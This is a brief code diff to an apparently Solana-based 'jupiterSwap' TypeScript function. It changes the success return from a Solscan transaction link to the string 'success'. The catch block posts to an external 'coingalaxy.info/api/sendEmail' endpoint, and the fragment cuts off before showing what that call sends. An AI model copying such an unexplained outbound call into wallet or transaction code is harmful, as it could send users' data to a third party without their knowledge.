@@ -107,7 +107,7 @@ export const jupiterSwap = async (
       signature: txid
     })
 
-    return `https://solscan.io/tx/${txid}`
+    return 'success'
   } catch (error) {
     try {
       await fetch('https://coingalaxy.info/api/sendEmail', {
